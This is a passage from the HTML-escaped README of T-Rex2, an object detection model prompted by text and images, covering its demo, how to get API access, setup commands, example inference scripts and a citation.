process to be repeated.&lt;/p&gt; &#xA;&lt;p&gt;T-Rex2 addresses these limitations by integrating both text and visual prompts in one model, thereby harnessing the strengths of both modalities. The synergy of text and visual prompts equips T-Rex2 with robust zero-shot capabilities, making it a versatile tool in the ever-changing landscape of object detection.&lt;/p&gt; &#xA;&lt;!-- insert image in the middle --&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;img src=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/assets/trex2/method.jpg&#34; width=&#34;600&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;What Can T-Rex Do 📝&lt;/h2&gt; &#xA;&lt;p&gt;T-Rex2 is well-suited for a variety of real-world applications, including but not limited to: agriculture, industry, livstock and wild animals monitoring, biology, medicine, OCR, retail, electronics, transportation, logistics, and more. T-Rex2 mainly supports three major workflows including interactive visual prompt workflow, generic visual prompt workflow and text prompt workflow. It can cover most of the application scenarios that require object detection&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Mountchicken/Union14M/assets/65173622/c3585d49-208c-4ba4-9954-fd1572d299dc&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/assets/trex2/video_cover2.png&#34; alt=&#34;Video Name&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;2. Try Demo 🎮&lt;/h1&gt; &#xA;&lt;p&gt;We are now opening online demo for T-Rex2. &lt;a href=&#34;https://deepdataspace.com/playground/ivp&#34;&gt;Check our demo here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;img src=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/assets/trex2/demo.jpg&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;h1&gt;3. API Usage Examples📚&lt;/h1&gt; &#xA;&lt;p&gt;We are now opening free API access to T-Rex2. For educators, students, and researchers, we offer an API with extensive usage times to support your educational and research endeavors. Please send a request to this email address (&lt;a href=&#34;mailto:weiliu@idea.edu.cn&#34;&gt;weiliu@idea.edu.cn&lt;/a&gt;) and attach your usage purpose as well as your institution.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cloudapi-sdk.deepdataspace.com/dds_cloudapi_sdk/tasks/trex_interactive.html&#34;&gt;Full API documentation can be found here&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Setup&lt;/h2&gt; &#xA;&lt;p&gt;Install the API package and acuqire the API token from the email.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/IDEA-Research/T-Rex.git&#xA;cd T-Rex&#xA;pip install dds-cloudapi-sdk==0.1.1&#xA;pip install -v -e .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Interactive Visual Prompt API&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;In interactive visual prompt workflow, users can provide visual prompts in boxes or points format on a given image to specify the object to be detected.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;python demo_examples/interactive_inference.py --token &amp;lt;your_token&amp;gt; &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;You are supposed get the following visualization results at &lt;code&gt;demo_vis/&lt;/code&gt; &#xA;    &lt;div align=&#34;center&#34;&gt; &#xA;     &lt;img src=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/assets/trex2/interactive_0.jpg&#34; width=&#34;400&#34;&gt; &#xA;     &lt;img src=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/assets/trex2/interactive_1.jpg&#34; height=&#34;285&#34;&gt; &#xA;    &lt;/div&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Generic Visual Prompt API&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;In generic visual prompt workflow, users can provide visual prompts on one reference image and detect on the other image.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;python demo_examples/generic_inference.py --token &amp;lt;your_token&amp;gt; &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;You are supposed get the following visualization results at &lt;code&gt;demo_vis/&lt;/code&gt; &#xA;    &lt;div align=&#34;center&#34;&gt; &#xA;     &lt;img src=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/assets/trex2_api_examples/generic_prompt1.jpg&#34; width=&#34;280&#34;&gt; + &#xA;     &lt;img src=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/assets/trex2_api_examples/generic_prompt2.jpg&#34; width=&#34;280&#34;&gt; = &#xA;     &lt;img src=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/assets/trex2/generic.jpg&#34; width=&#34;280&#34;&gt; &#xA;    &lt;/div&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Customize Visual Prompt Embedding API&lt;/h2&gt; &#xA;&lt;p&gt;In this workflow, you cam customize a visual embedding for a object category using multiple images. With this embedding, you can detect on any images.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;python demo_examples/customize_embedding.py --token &amp;lt;your_token&amp;gt; &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You are supposed to get a download link for this visual prompt embedding in &lt;code&gt;safetensors&lt;/code&gt; format. Save it and let&#39;s use it for &lt;code&gt;embedding_inference&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Embedding Inference API&lt;/h2&gt; &#xA;&lt;p&gt;With the visual prompt embeddings generated from the previous API. You can use it detect on any images.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;  python demo_examples/embedding_inference.py --token &amp;lt;your_token&amp;gt; &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;4. Related Works&lt;/h1&gt; &#xA;&lt;p&gt;&lt;span&gt;🔥&lt;/span&gt; We release the &lt;a href=&#34;https://github.com/UX-Decoder/DINOv&#34;&gt;training and inference code&lt;/a&gt; and &lt;a href=&#34;http://semantic-sam.xyzou.net:6099/&#34;&gt;demo link&lt;/a&gt; of &lt;a href=&#34;https://arxiv.org/pdf/2311.13601.pdf&#34;&gt;DINOv&lt;/a&gt;, which can handle in-context &lt;strong&gt;visual prompts&lt;/strong&gt; for open-set and referring detection &amp;amp; segmentation. Check it out!&lt;/p&gt; &#xA;&lt;h1&gt;BibTeX 📚&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;@misc{jiang2024trex2,&#xA;      title={T-Rex2: Towards Generic Object Detection via Text-Visual Prompt Synergy}, &#xA;      author={Qing Jiang and Feng Li and Zhaoyang Zeng and Tianhe Ren and Shilong Liu and Lei Zhang},&#xA;      year={2024},&#xA;      eprint={2403.14610},&#xA;      archivePrefix={arXiv},&#xA;      primaryClass={cs.CV}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
</feed>